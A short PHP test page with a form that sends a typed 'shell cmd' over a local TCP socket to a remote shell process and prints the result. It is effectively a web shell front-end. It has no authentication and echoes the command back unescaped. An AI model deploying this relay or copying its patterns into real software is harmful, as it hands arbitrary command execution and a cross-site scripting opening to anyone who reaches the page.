<?php
    
    function exec_cmd($cmd)
    {
        $socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
	
	    if(socket_connect($socket,'127.0.0.1', 9999) == false)
	    {
          echo 'connect fail massege:'.socket_strerror(socket_last_error());
        }else
        {
            #send cmd
            socket_write($socket, $cmd ,strlen($cmd));
            
            if($cmd == 'exit()')
            {
                socket_close($socket);
                return $cmd;
            }
       
            #get shell res
            $res = socket_read($socket, 1024);
            socket_close($socket);
            return $res;
        }
    }
?>

<form id="form" name="form" method="post" action='test.php'>
    <tr>
        <td>shell cmd：</td>
        <td> <input type="text" name="cmd" /> </td>
    </tr>
    <tr>
        <td >
            <input type="submit" value="submit" />
        </td>
    </tr>
</form>

<?php
    $cmd = $_POST['cmd'];
    if($cmd == '')
    {
        echo 'please input your cmd in the text';
        echo '<BR>';
        echo 'use exit() to exit the remote shell process';
        echo '(bug:reconnect will be failed, kill the process manual use kill -9 PID, or just wait for a moment)';
        echo '<BR>';
    }
    else
    {
        echo 'shell_cmd: '.$cmd;
        echo '<BR>';
        
        $cmd_res = exec_cmd($cmd);
        echo $cmd_res;
        echo '<BR>';
    }
?>
